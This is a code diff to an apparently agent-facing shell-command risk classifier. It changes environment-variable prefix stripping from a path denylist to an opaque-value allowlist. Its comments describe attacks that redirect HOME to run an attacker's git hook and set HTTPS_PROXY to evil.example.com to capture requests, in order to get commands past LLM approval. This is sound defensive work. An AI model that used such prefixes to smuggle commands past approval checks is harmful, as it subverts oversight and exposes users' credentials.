@@ -77,30 +77,51 @@ const GRAMMAR_PREFIX_KEYWORDS: readonly string[] = [
 const ASSIGNMENT_PREFIX_RE = /^([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|'[^']*'|\S*)(?:\s+|$)/;
 
 /**
- * An assignment whose VALUE names a filesystem location is never peeled,
- * whatever the variable is called.
+ * An assignment is peeled ONLY when its value is an OPAQUE TOKEN — no path, no
+ * endpoint, no structure of any kind. Allowlist, not denylist, and on the VALUE
+ * rather than the variable name.
  *
- * The name denylist below cannot win this on its own. Review of #1004 proved
- * `HOME=/tmp/evilhome git commit` peels to a covered `git commit` while a
- * `.gitconfig` at the redirected HOME sets `core.hooksPath` and runs an
- * attacker's `pre-commit` — demonstrated end to end against real git 2.55. The
- * same shape reaches `XDG_CONFIG_HOME` (git reads it too), `KUBECONFIG`
- * (`exec:` credential plugins), `AWS_CONFIG_FILE` (`credential_process`),
- * `DOCKER_CONFIG` (`credHelpers`), and every future tool that learns to read a
- * config path from the environment. Enumerating tools is a race this cannot
- * win.
+ * Two rounds of review drove this. First: `HOME=/tmp/evilhome git commit` peeled
+ * to a covered `git commit` while a `.gitconfig` at the redirected HOME set
+ * `core.hooksPath` and ran an attacker's `pre-commit` — proven end to end
+ * against real git. Enumerating tool names (`HOME`, `XDG_CONFIG_HOME`,
+ * `KUBECONFIG`, `AWS_CONFIG_FILE`, `DOCKER_CONFIG`, ...) is a race that cannot
+ * be won, so the test moved to the value: does it point somewhere?
  *
- * What every one of those attacks has in common is not the variable name, it is
- * that the value points somewhere. So that is what is tested. The benign
- * assignments this feature exists to cover look nothing like it — measured on
- * real traffic they are opaque tokens (`ACC=da8d7a2a`, `TOK=...`,
- * `ZONE=e684...`, `HITS=0`).
+ * Second: "points somewhere" was still too narrow. `HTTPS_PROXY=evil.example.com:8080
+ * gh pr view 1` contains no `/` and no `~`, and `gh` honours it — approved at
+ * `trusted` with no opt-in, handing an attacker-controlled network position the
+ * request metadata. Not every dangerous value is path-SHAPED.
  *
- * Costs an escalation on an honest `D=/some/dir` prefix. That is the right
- * direction to be wrong in: the alternative is a covered command running under
- * an attacker's configuration.
+ * So the rule is inverted: instead of naming the shapes that are dangerous
+ * (unbounded), name the one shape that is safe. A value of letters, digits,
+ * dots, dashes, underscores, commas and pluses cannot name a filesystem
+ * location, a host:port, a URL, or a user@host. Everything else escalates.
+ *
+ * The benign cohort this feature exists for passes cleanly — measured on real
+ * traffic they are opaque tokens (`ACC=da8d7a2a868`, `ZONE=e684135de46029c`,
+ * `HITS=0`). An honest `D=/some/dir` or `TZ=America/New_York` costs one prompt,
+ * which is the right direction to be wrong in.
  */
-const PATH_LIKE_VALUE_RE = /[/~]/;
+const OPAQUE_VALUE_RE = /^[A-Za-z0-9._,+-]*$/;
+
+/**
+ * True if a leading `NAME=value` token may be removed without changing what the
+ * rest of the command means.
+ *
+ * Exported because `risk-bands.ts` strips assignments too, on its own path to
+ * `enforceRiskCeiling`. It had its own recognizer that stripped EVERY
+ * assignment unconditionally, so `HOME=/tmp/evilhome git commit` graded
+ * `moderate` — identical to a plain `git commit` — and the ceiling that exists
+ * to override a wrong LLM approval could never fire on it. Two consumers
+ * deriving the same judgement from two different pieces of code, which is the
+ * fourth instance of that shape in this module; the answer each time is one
+ * function, shared.
+ */
+export function isPeelableAssignment(name: string, rawValue: string): boolean {
+  if (redirectsExecution(name)) return false;
+  return OPAQUE_VALUE_RE.test(rawValue.replace(/^["']|["']$/g, ''));
+}
 
 /**
  * Variables whose assignment changes WHICH program a command name resolves to,
@@ -222,13 +243,7 @@ export function stripShellGrammar(segment: string): StrippedSegment {
     if (keyword === null) {
       const assignment = ASSIGNMENT_PREFIX_RE.exec(rest);
       if (assignment === null) break;
-      // Two independent refusals: what the variable is called, and whether its
-      // value points at a filesystem location. Either one alone leaks -- the
-      // name list misses `HOME`-class config redirection, the value test misses
-      // non-path settings like `IFS=x`.
-      if (redirectsExecution(assignment[1] ?? '')) break;
-      const value = (assignment[2] ?? '').replace(/^["']|["']$/g, '');
-      if (PATH_LIKE_VALUE_RE.test(value)) break;
+      if (!isPeelableAssignment(assignment[1] ?? '', assignment[2] ?? '')) break;
       rest = rest.slice(assignment[0].length).trim();
       if (rest === '') return { command: '', structural: true };
       continue;
